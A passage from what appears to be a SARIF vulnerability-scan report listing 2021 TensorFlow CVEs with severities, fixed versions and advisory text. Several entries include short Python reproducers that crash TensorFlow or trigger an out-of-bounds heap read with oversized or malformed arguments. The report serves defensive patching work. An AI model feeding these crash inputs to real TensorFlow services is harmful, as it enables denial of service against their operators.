3\n``` \n\n### Patches\nWe have patched the issue in GitHub commit [af5fcebb37c8b5d71c237f4e59c6477015c78ce6](https://github.com/tensorflow/tensorflow/commit/af5fcebb37c8b5d71c237f4e59c6477015c78ce6).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-41206",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41206"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41206",
              "help": {
                "text": "Vulnerability CVE-2021-41206\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41206)\n### Impact\nSeveral TensorFlow operations are missing validation for the shapes of the tensor arguments involved in the call. Depending on the API, this can result in undefined behavior and segfault or `CHECK`-fail related crashes but in some scenarios writes and reads from heap populated arrays are also possible.\n\nWe have discovered these issues internally via tooling while working on improving/testing GPU op determinism. As such, we don`t have reproducers and there will be multiple fixes for these issues.\n\n### Patches\nWe have patched the issue in GitHub commits [68422b215e618df5ad375bcdc6d2052e9fd3080a](https://github.com/tensorflow/tensorflow/commit/68422b215e618df5ad375bcdc6d2052e9fd3080a), [4d74d8a00b07441cba090a02e0dd9ed385145bf4](https://github.com/tensorflow/tensorflow/commit/4d74d8a00b07441cba090a02e0dd9ed385145bf4), [579261dcd446385831fe4f7457d802a59685121d](https://github.com/tensorflow/tensorflow/commit/579261dcd446385831fe4f7457d802a59685121d), [da4aad5946be30e5f049920fa076e1f7ef021261](https://github.com/tensorflow/tensorflow/commit/da4aad5946be30e5f049920fa076e1f7ef021261), [4dddb2fd0b01cdd196101afbba6518658a2c9e07](https://github.com/tensorflow/tensorflow/commit/4dddb2fd0b01cdd196101afbba6518658a2c9e07), and [e7f497570abb6b4ae5af4970620cd880e4c0c904](https://github.com/tensorflow/tensorflow/commit/e7f497570abb6b4ae5af4970620cd880e4c0c904).\n\nThese fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-41206**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41206](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41206)|\n\n### Impact\nSeveral TensorFlow operations are missing validation for the shapes of the tensor arguments involved in the call. Depending on the API, this can result in undefined behavior and segfault or `CHECK`-fail related crashes but in some scenarios writes and reads from heap populated arrays are also possible.\n\nWe have discovered these issues internally via tooling while working on improving/testing GPU op determinism. As such, we don`t have reproducers and there will be multiple fixes for these issues.\n\n### Patches\nWe have patched the issue in GitHub commits [68422b215e618df5ad375bcdc6d2052e9fd3080a](https://github.com/tensorflow/tensorflow/commit/68422b215e618df5ad375bcdc6d2052e9fd3080a), [4d74d8a00b07441cba090a02e0dd9ed385145bf4](https://github.com/tensorflow/tensorflow/commit/4d74d8a00b07441cba090a02e0dd9ed385145bf4), [579261dcd446385831fe4f7457d802a59685121d](https://github.com/tensorflow/tensorflow/commit/579261dcd446385831fe4f7457d802a59685121d), [da4aad5946be30e5f049920fa076e1f7ef021261](https://github.com/tensorflow/tensorflow/commit/da4aad5946be30e5f049920fa076e1f7ef021261), [4dddb2fd0b01cdd196101afbba6518658a2c9e07](https://github.com/tensorflow/tensorflow/commit/4dddb2fd0b01cdd196101afbba6518658a2c9e07), and [e7f497570abb6b4ae5af4970620cd880e4c0c904](https://github.com/tensorflow/tensorflow/commit/e7f497570abb6b4ae5af4970620cd880e4c0c904).\n\nThese fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "7.0",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-41199",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41199"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41199",
              "help": {
                "text": "Vulnerability CVE-2021-41199\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41199)\n### Impact\nIf `tf.image.resize` is called with a large input argument then the TensorFlow process will crash due to a `CHECK`-failure caused by an overflow.\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.keras.layers.UpSampling2D(\n  size=1610637938,\n  data_format=`channels_first`,\n  interpolation=`bilinear`)(np.ones((5,1,1,1)))\n```\n\nThe number of elements in the output tensor is too much for the `int64_t` type and the overflow is detected via a `CHECK` statement. This aborts the process.\n\n### Patches\nWe have patched the issue in GitHub commit [e5272d4204ff5b46136a1ef1204fc00597e21837](https://github.com/tensorflow/tensorflow/commit/e5272d4204ff5b46136a1ef1204fc00597e21837) (merging [#51497](https://github.com/tensorflow/tensorflow/pull/51497)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46914).",
                "markdown": "**Vulnerability CVE-2021-41199**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41199](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41199)|\n\n### Impact\nIf `tf.image.resize` is called with a large input argument then the TensorFlow process will crash due to a `CHECK`-failure caused by an overflow.\n\n```python\nimport tensorflow as tf\nimport numpy as np\n\ntf.keras.layers.UpSampling2D(\n  size=1610637938,\n  data_format=`channels_first`,\n  interpolation=`bilinear`)(np.ones((5,1,1,1)))\n```\n\nThe number of elements in the output tensor is too much for the `int64_t` type and the overflow is detected via a `CHECK` statement. This aborts the process.\n\n### Patches\nWe have patched the issue in GitHub commit [e5272d4204ff5b46136a1ef1204fc00597e21837](https://github.com/tensorflow/tensorflow/commit/e5272d4204ff5b46136a1ef1204fc00597e21837) (merging [#51497](https://github.com/tensorflow/tensorflow/pull/51497)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46914)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41195",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41195"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41195",
              "help": {
                "text": "Vulnerability CVE-2021-41195\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41195)\n### Impact\nThe implementation of `tf.math.segment_*` operations results in a `CHECK`-fail related abort (and denial of service) if a segment id in `segment_ids` is large.\n\n```python\nimport tensorflow as tf\n\ntf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    \ntf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\n```\n\nThis is similar to [CVE-2021-29584](https://github.com/tensorflow/tensorflow/blob/3a74f0307236fe206b046689c4d76f57c9b74eee/tensorflow/security/advisory/tfsa-2021-071.md) (and similar other reported vulnerabilities in TensorFlow, localized to specific APIs): the [implementation](https://github.com/tensorflow/tensorflow/blob/dae66e518c88de9c11718cd0f8f40a0b666a90a0/tensorflow/core/kernels/segment_reduction_ops_impl.h) (both on CPU and GPU) computes the output shape using [`AddDim`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L395-L408). However, if the number of elements in the tensor overflows an `int64_t` value, `AddDim` results in a `CHECK` failure which provokes a `std::abort`. Instead, code should use [`AddDimWithStatus`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L410-L440).\n\n\n### Patches\nWe have patched the issue in GitHub commit [e9c81c1e1a9cd8dd31f4e83676cab61b60658429](https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429) (merging [#51733](https://github.com/tensorflow/tensorflow/pull/51733)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.      \n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.     \n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46888).",
                "markdown": "**Vulnerability CVE-2021-41195**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41195](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41195)|\n\n### Impact\nThe implementation of `tf.math.segment_*` operations results in a `CHECK`-fail related abort (and denial of service) if a segment id in `segment_ids` is large.\n\n```python\nimport tensorflow as tf\n\ntf.math.segment_max(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_min(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_mean(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])    \ntf.math.segment_sum(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\ntf.math.segment_prod(data=np.ones((1,10,1)), segment_ids=[1676240524292489355])\n```\n\nThis is similar to [CVE-2021-29584](https://github.com/tensorflow/tensorflow/blob/3a74f0307236fe206b046689c4d76f57c9b74eee/tensorflow/security/advisory/tfsa-2021-071.md) (and similar other reported vulnerabilities in TensorFlow, localized to specific APIs): the [implementation](https://github.com/tensorflow/tensorflow/blob/dae66e518c88de9c11718cd0f8f40a0b666a90a0/tensorflow/core/kernels/segment_reduction_ops_impl.h) (both on CPU and GPU) computes the output shape using [`AddDim`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L395-L408). However, if the number of elements in the tensor overflows an `int64_t` value, `AddDim` results in a `CHECK` failure which provokes a `std::abort`. Instead, code should use [`AddDimWithStatus`](https://github.com/tensorflow/tensorflow/blob/0b6b491d21d6a4eb5fbab1cca565bc1e94ca9543/tensorflow/core/framework/tensor_shape.cc#L410-L440).\n\n\n### Patches\nWe have patched the issue in GitHub commit [e9c81c1e1a9cd8dd31f4e83676cab61b60658429](https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429) (merging [#51733](https://github.com/tensorflow/tensorflow/pull/51733)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.      \n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.     \n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46888)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41214",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41214"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41214",
              "help": {
                "text": "Vulnerability CVE-2021-41214\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41214](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41214)\n### Impact\nThe [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64) has an undefined behavior due to binding a reference to `nullptr`. In the following scenario, this results in a crash:\n\n```python\nimport tensorflow as tf\n  \n@tf.function                 \ndef test():     \n  y = tf.ragged.cross([tf.ragged.constant([[`1`]]),`2`])\n  return y                   \n                             \ntest()        \n```                          \n             \n### Patches\nWe have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).\n  \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41214**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41214](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41214)|\n\n### Impact\nThe [shape inference code for `tf.ragged.cross`](https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/ops/ragged_array_ops.cc#L64) has an undefined behavior due to binding a reference to `nullptr`. In the following scenario, this results in a crash:\n\n```python\nimport tensorflow as tf\n  \n@tf.function                 \ndef test():     \n  y = tf.ragged.cross([tf.ragged.constant([[`1`]]),`2`])\n  return y                   \n                             \ntest()        \n```                          \n             \n### Patches\nWe have patched the issue in GitHub commit [fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8](https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8).\n  \nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-41202",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41202"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41202",
              "help": {
                "text": "Vulnerability CVE-2021-41202\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41202)\n### Impact\nWhile calculating the size of the output within the `tf.range` kernel, there is a conditional statement of type `int64 = condition ? int64 : double`. Due to C++ implicit conversion rules, both branches of the condition will be cast to `double` and the result would be truncated before the assignment. This result in overflows:\n\n```python\nimport tensorflow as tf\n\ntf.sparse.eye(num_rows=9223372036854775807, num_columns=None)\n```\n  \nSimilarly, `tf.range` would result in crashes due to overflows if the start or end point are too large.\n\n```python\nimport tensorflow as tf\n\ntf.range(start=-1e+38, limit=1)\n```\n\n### Patches\nWe have patched the issue in GitHub commits [6d94002a09711d297dbba90390d5482b76113899](https://github.com/tensorflow/tensorflow/commit/6d94002a09711d297dbba90390d5482b76113899) (merging [#51359](https://github.com/tensorflow/tensorflow/pull/51359)) and [1b0e0ec27e7895b9985076eab32445026ae5ca94](https://github.com/tensorflow/tensorflow/commit/1b0e0ec27e7895b9985076eab32445026ae5ca94) (merging [#51711](https://github.com/tensorflow/tensorflow/pull/51711)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46912), [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46899) and [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46889).\n",
                "markdown": "**Vulnerability CVE-2021-41202**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41202](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41202)|\n\n### Impact\nWhile calculating the size of the output within the `tf.range` kernel, there is a conditional statement of type `int64 = condition ? int64 : double`. Due to C++ implicit conversion rules, both branches of the condition will be cast to `double` and the result would be truncated before the assignment. This result in overflows:\n\n```python\nimport tensorflow as tf\n\ntf.sparse.eye(num_rows=9223372036854775807, num_columns=None)\n```\n  \nSimilarly, `tf.range` would result in crashes due to overflows if the start or end point are too large.\n\n```python\nimport tensorflow as tf\n\ntf.range(start=-1e+38, limit=1)\n```\n\n### Patches\nWe have patched the issue in GitHub commits [6d94002a09711d297dbba90390d5482b76113899](https://github.com/tensorflow/tensorflow/commit/6d94002a09711d297dbba90390d5482b76113899) (merging [#51359](https://github.com/tensorflow/tensorflow/pull/51359)) and [1b0e0ec27e7895b9985076eab32445026ae5ca94](https://github.com/tensorflow/tensorflow/commit/1b0e0ec27e7895b9985076eab32445026ae5ca94) (merging [#51711](https://github.com/tensorflow/tensorflow/pull/51711)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46912), [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46899) and [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46889).\n"
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41210",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41210"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41210",
              "help": {
                "text": "Vulnerability CVE-2021-41210\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41210)\n### Impact\nThe [shape inference functions for `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/ops/count_ops.cc#L43-L50) can trigger a read outside of bounds of heap allocated array:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef func():\n  return tf.raw_ops.SparseCountSparseOutput(\n    indices=[1],\n    values=[[1]],\n    dense_shape=[10],\n    weights=[],\n    binary_output= True)\n\nfunc()\n```\n\nThe function fails to check that the first input (i.e., `indices`) has rank 2:\n\n```cc\n  auto rank = c-\u003eDim(c-\u003einput(0), 1);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [701cfaca222a82afbeeb17496bd718baa65a67d2](https://github.com/tensorflow/tensorflow/commit/701cfaca222a82afbeeb17496bd718baa65a67d2).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.",
                "markdown": "**Vulnerability CVE-2021-41210**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41210](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41210)|\n\n### Impact\nThe [shape inference functions for `SparseCountSparseOutput`](https://github.com/tensorflow/tensorflow/blob/e0b6e58c328059829c3eb968136f17aa72b6c876/tensorflow/core/ops/count_ops.cc#L43-L50) can trigger a read outside of bounds of heap allocated array:\n\n```python\nimport tensorflow as tf\n\n@tf.function\ndef func():\n  return tf.raw_ops.SparseCountSparseOutput(\n    indices=[1],\n    values=[[1]],\n    dense_shape=[10],\n    weights=[],\n    binary_output= True)\n\nfunc()\n```\n\nThe function fails to check that the first input (i.e., `indices`) has rank 2:\n\n```cc\n  auto rank = c-\u003eDim(c-\u003einput(0), 1);\n```\n\n### Patches\nWe have patched the issue in GitHub commit [701cfaca222a82afbeeb17496bd718baa65a67d2](https://github.com/tensorflow/tensorflow/commit/701cfaca222a82afbeeb17496bd718baa65a67d2).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360."
              },
              "properties": {
                "security-severity": "7.1",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-41198",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41198"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41198",
              "help": {
                "text": "Vulnerability CVE-2021-41198\nSeverity: medium\nFixed Version: 2.6.1\nLink: [CVE-2021-41198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41198)\n### Impact\nIf `tf.tile` is called with a large input argument then the TensorFlow process will crash due to a `CHECK`-failure caused by an overflow.\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.keras.backend.tile(x=np.ones((1,1,1)), n=[100000000,100000000, 100000000])\n```\n\nThe number of elements in the output tensor is too much for the `int64_t` type and the overflow is detected via a `CHECK` statement. This aborts the process.\n\n### Patches\nWe have patched the issue in GitHub commit [9294094df6fea79271778eb7e7ae1bad8b5ef98f](https://github.com/tensorflow/tensorflow/commit/9294094df6fea79271778eb7e7ae1bad8b5ef98f) (merging [#51138](https://github.com/tensorflow/tensorflow/pull/51138)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46911).",
                "markdown": "**Vulnerability CVE-2021-41198**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.6.1|[CVE-2021-41198](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41198)|\n\n### Impact\nIf `tf.tile` is called with a large input argument then the TensorFlow process will crash due to a `CHECK`-failure caused by an overflow.\n\n```python\nimport tensorflow as tf\nimport numpy as np\ntf.keras.backend.tile(x=np.ones((1,1,1)), n=[100000000,100000000, 100000000])\n```\n\nThe number of elements in the output tensor is too much for the `int64_t` type and the overflow is detected via a `CHECK` statement. This aborts the process.\n\n### Patches\nWe have patched the issue in GitHub commit [9294094df6fea79271778eb7e7ae1bad8b5ef98f](https://github.com/tensorflow/tensorflow/commit/9294094df6fea79271778eb7e7ae1bad8b5ef98f) (merging [#51138](https://github.com/tensorflow/tensorflow/pull/51138)).\n\nThe fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported externally via a [GitHub issue](https://github.com/tensorflow/tensorflow/issues/46911)."
              },
              "properties": {
                "security-severity": "5.5",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2021-41203",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2021-41203"
              },
              "defaultConfiguration": {
                "level": "error"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41203",
              "help": {
                "text": "Vulnerability CVE-2021-41203\nSeverity: high\nFixed Version: 2.6.1\nLink: [CVE-2021-41203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41203)\n### Impact\nAn attacker can trigger undefined behavior, integer overflows, segfaults and `CHECK`-fail crashes if they can change saved checkpoints from outside of TensorFlow.\n\nThis is because the checkpoints loading infrastructure is missing validation for invalid file formats.\n\n### Patches\nWe have patched the issue in GitHub commits [b619c6f865715ca3b15ef1842b5b95edbaa710ad](https://github.com/tensorflow/tensorflow/commit/b619c6f865715ca3b15ef1842b5b95edbaa710ad), [e8dc63704c88007ee4713076605c90188d66f3d2](https://github.com/tensorflow/tensorflow/commit/e8dc63704c88007ee4713076605c90188d66f3d2), [368af875869a204b4ac552b9ddda59f6a46a56ec](https://github.com/tensorflow/tensorflow/commit/368af875869a204b4ac552b9ddda59f6a46a56ec), and [abcced051cb1bd8fb05046ac3b6023a7ebcc4578](https://github.com/tensorflow/tensorflow/commit/abcced051cb1bd8fb05046ac3b6023a7ebcc4578).\n\nThese fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.",
                "markdown": "**Vulnerability CVE-2021-41203**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|high|2.6.1|[CVE-2021-41203](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-41203)|\n\n### Impact\nAn attacker can trigger undefined behavior, integer overflows, segfaults and `CHECK`-fail crashes if they can change saved checkpoints from outside of TensorFlow.\n\nThis is because the checkpoints loading infrastructure is missing validation for invalid file formats.\n\n### Patches\nWe have patched the issue in GitHub commits [b619c6f865715ca3b15ef1842b5b95edbaa710ad](https://github.com/tensorflow/tensorflow/commit/b619c6f865715ca3b15ef1842b5b95edbaa710ad), [e8dc63704c88007ee4713076605c90188d66f3d2](https://github.com/tensorflow/tensorflow/commit/e8dc63704c88007ee4713076605c90188d66f3d2), [368af875869a204b4ac552b9ddda59f6a46a56ec](https://github.com/tensorflow/tensorflow/commit/368af875869a204b4ac552b9ddda59f6a46a56ec), and [abcced051cb1bd8fb05046ac3b6023a7ebcc4578](https://github.com/tensorflow/tensorflow/commit/abcced051cb1bd8fb05046ac3b6023a7ebcc4578).\n\nThese fixes will be included in TensorFlow 2.7.0. We will also cherrypick these commits on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.\n\n### For more information \nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions."
              },
              "properties": {
                "security-severity": "7.8",
                "tags": [
                  "vulnerability",
                  "security",
                  "high"
                ]
              }
            },
            {
              "id": "CVE-2021-41215",
